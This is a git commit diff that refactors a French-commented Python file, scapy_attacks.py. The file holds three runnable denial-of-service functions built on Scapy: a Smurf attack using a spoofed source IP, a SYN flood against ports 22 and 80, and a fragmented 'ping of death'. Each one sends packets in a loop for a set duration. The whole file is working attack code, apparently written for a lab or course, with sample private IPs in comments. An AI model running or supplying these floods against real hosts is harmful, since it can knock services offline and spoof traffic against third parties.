b794c8f8698091de9efc655ed066d6f4fa0ddbd9
Luis Ribeiro <luis.ribeiro077@gmail.com>
2023-04-04 21:46:08 +0200

    refactorisation des attaques

--- scapy_attacks.py
+++ scapy_attacks.py
@@ -1,61 +1,56 @@
 import scapy.all as scapy
 import time
 
-# IP_Source = '10.0.2.16'
-# IP_Dest = '192.168.86.213'
+def execute_pendant_duree(duree, fonction):
+    debut = time.time()
+    while (time.time() - debut) < duree:
+        fonction()
 
-
-def Smurf_Attack(IP_Source, IP_Dest, duree):
-    """ Smurf attack
-    Distributed denial of service (DDoS) attack in which an attacker attempts 
+def smurf_attack(ip_source, ip_dest, duree):
+    """Smurf attack
+    Distributed denial of service (DDoS) attack in which an attacker attempts
     to saturate a target server with ICMP packets
 
     Args:
-        IP_Source (String): the IP of the source machine
-        IP_Dest (String): the IP of the destination machine
+        ip_source (String): the IP of the source machine
+        ip_dest (String): the IP of the destination machine
         duree (int): the duration of the attack
     """
-    print("Smurf attack on " + IP_Dest + " for " + str(duree) + " seconds")
-    debut = time.time()
-    while (time.time() - debut) < duree:
-        scapy.send(scapy.IP(src=IP_Source, dst=IP_Dest)/scapy.ICMP())
+    print("Smurf attack on " + ip_dest + " for " + str(duree) + " seconds")
+    execute_pendant_duree(duree, lambda: scapy.send(scapy.IP(src=ip_source, dst=ip_dest)/scapy.ICMP()))
 
-
-def Syn_Flooding_Attack(IP_Dest, duree):
-    """ Syn flooding attack
-    Computer attack aiming at achieving a denial of service. 
+def syn_flooding_attack(ip_dest, duree):
+    """Syn flooding attack
+    Computer attack aiming at achieving a denial of service.
     It is applied within the TCP protocol and consists in sending a succession of SYN requests to the target
 
     Args:
-        IP_Dest (String): the IP of the destination machine
+        ip_dest (String): the IP of the destination machine
         duree (int): the duration of the attack
     """
-    print("Syn flooding attack on " + IP_Dest +
-          " for " + str(duree) + " seconds")
+    print("Syn flooding attack on " + ip_dest + " for " + str(duree) + " seconds")
     topt = [('Timestamp', (10, 0))]
-    p = scapy.IP(dst=IP_Dest, id=1111, ttl=99)/scapy.TCP(sport=scapy.RandShort(),
+    p = scapy.IP(dst=ip_dest, id=1111, ttl=99)/scapy.TCP(sport=scapy.RandShort(),
                                                          dport=[22, 80], seq=12345, ack=1000, window=1000, flags="S", options=topt)/"SYNFlood"
-    debut = time.time()
-    while (time.time() - debut) < duree:
-        scapy.send(p)
+    execute_pendant_duree(duree, lambda: scapy.send(p))
 
-
-def Ping_of_death(IP_Dest, duree):
-    """ Ping of death attack
+def ping_of_death(ip_dest, duree):
+    """Ping of death attack
     Denial of service attack performed by sending a malformed ping packet to a target machine
 
     Args:
-        IP_Dest (String): the IP of the destination machine
+        ip_dest (String): the IP of the destination machine
         duree (int): the duration of the attack
     """
-    print("Ping of death attack on " + IP_Dest +
-          " for " + str(duree) + " seconds")
-    debut = time.time()
-    while (time.time() - debut) < duree:
-        scapy.send(scapy.fragment(
-            scapy.IP(dst=IP_Dest)/scapy.ICMP()/('X' * 600)))
+    print("Ping of death attack on " + ip_dest + " for " + str(duree) + " seconds")
+    execute_pendant_duree(duree, lambda: scapy.send(scapy.fragment(scapy.IP(dst=ip_dest)/scapy.ICMP()/('X' * 600))))
 
 
-# Smurf_Attack(IP_Source, IP_Dest, 10)
-# Syn_Flooding_Attack(IP_Dest, 10)
-# Ping_of_death(IP_Dest, 10)
+
+# ip_source = '10.0.2.16'
+# ip_dest = '192.168.86.213'
+
+# smurf_attack(ip_source, ip_dest, 10)
+# syn_flooding_attack(ip_dest, 10)
+# ping_of_death(ip_dest, 10)
+
